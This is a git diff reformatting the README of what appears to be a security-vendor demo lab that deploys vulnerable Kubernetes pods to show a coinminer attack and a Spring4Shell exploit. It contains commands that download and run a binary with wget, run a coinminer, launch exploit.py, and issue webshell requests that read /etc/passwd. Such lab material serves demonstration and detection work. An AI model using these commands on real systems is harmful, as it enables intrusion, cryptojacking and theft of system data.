@@ -1,30 +1,42 @@
 # Spring4Shell and Coinminer PoC
 
-# This is for testing and demo purposes
+## This is for testing and demo purposes
 
-STEP 0. EKS와 같은 K8S 클러스터, 클러스터에 접속가능한 VM 준비
-STEP 1. Git 설치후 본 Repo 를 clone 혹은 .zip으로 다운로드
-STEP 2. Dockerfile을 docker build . -t spring4shell 로 빌드하여 Registry에 올리거나, 로컬 경로 메모
+### STEP 0. EKS와 같은 K8S 클러스터, 클러스터에 접속가능한 VM 준비
+
+### STEP 1. Git 설치후 본 Repo 를 clone 혹은 .zip으로 다운로드
+
+### STEP 2. Dockerfile을 docker build . -t spring4shell 로 빌드하여 Registry에 올리거나, 로컬 경로 메모
+
 <img width="1996" height="594" alt="image" src="https://github.com/user-attachments/assets/5939392d-e613-4c49-b052-6dfe67603e10" />
 
-STEP 3. kubectl apply -f xdr_for_cloud_demo.yaml 의 이미지 경로 확인 및 수정(주석 참조)
-STEP 4. kubectl get all 로 pod 및 service 확인
+### STEP 3. kubectl apply -f xdr_for_cloud_demo.yaml 의 이미지 경로 확인 및 수정(주석 참조)
+
+### STEP 4. kubectl get all 로 pod 및 service 확인
+
 아래 YAML file에 kubectl apply:
 
+```
 $ kubectl apply -f xdr_for_cloud_demo.yaml
 pod/jie-spring4shell-pod created
 pod/vulmachine-pod created
 service/jie-sprig4shell created
+```
+
+
 2개의 pod와 1개의 서비스가 성공적으로 생성되었다면 아래 커맨드를 통해 STATUS를 점검합니다.
 
-$ kubectl get all
-WebPage
+`$ kubectl get all
+`
+<img width="2278" height="928" alt="image" src="https://github.com/user-attachments/assets/81e41e7e-54bf-462a-bcd5-07cdb401b0d5" />
 
 Coinminer pod 및 Spring4Shell pod - 취약한 pod 가 2개 생성됩니다.
 
-STEP 5. Use cases
-1. Coinminer Attack
-Get the malware sample from Wildfire and execute it
+### STEP 5. Use cases
+---
+## 1. Coinminer Attack
+#### Get the malware sample from Wildfire and execute it
+```
 $ kubectl exec -it vulmachine-pod  -- /bin/bash
 root@vulmachine-pod:/# wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/sample
 --2023-04-24 03:19:40--  http://wildfire.paloaltonetworks.com/publicapi/test/elf
@@ -40,25 +52,37 @@ Saving to: '/tmp/sample'
 
 root@vulmachine-pod:/# chmod +x /tmp/sample 
 root@vulmachine-pod:/# ./tmp/sample
-Execute the coinminer
+```
+
+### Execute the coinminer
+
+```
 $ kubectl exec -it vulmachine-pod  -- /bin/bash
 root@vulmachine-pod:/# ./tmp/coinminer
-WebPage
+```
 
-2. Exploit the Spring4Shell service
-kubectl get all 명령의 출력을 확인하여 배포된 서비스의 EXTERNAL-IP를 찾고, 해당 IP 주소를 웹 브라우저에 입력하여 접속합니다.
+<img width="1568" height="556" alt="image" src="https://github.com/user-attachments/assets/f8dd2ca3-7e5a-42ed-b94d-6fbef710907f" />
 
-WebPage
+## 2. Exploit the Spring4Shell service
+`kubectl get all `명령의 출력을 확인하여 배포된 서비스의 EXTERNAL-IP를 찾고, 해당 IP 주소를 웹 브라우저에 입력하여 접속합니다.
+
+<img width="545" height="93" alt="image" src="https://github.com/user-attachments/assets/12aad2bb-b32d-437a-8cfb-c50f644bd183" />
 
 위 화면을 확인하였으면 exploit.py 로 공격을 실행합니다.
 
+```
 $ python3 exploit.py --url "http://"your service external ip":8080/helloworld/greeting"
-WebPage
+```
+
+<img width="2332" height="398" alt="image" src="https://github.com/user-attachments/assets/7b7f6ecb-4ef1-4e86-a7f2-2fc3af68a09d" />
 
 위 과정이 완료되면 webshell이 서버에 업로드되며, 아래 명령어를 사용하여 id 또는 /etc/password 파일을 확인할 수 있습니다.
 
+```
 $ http://"your service external ip":8080/webshell.jsp?cmd=id
 $ http://"your service external ip":8080/webshell.jsp?cmd=cat%20/etc/passwd
 $ http://"your service external ip":8080/webshell.jsp?cmd=whoami
+```
+
 Credit
 @reznok for helping on building a spring4shell container image.
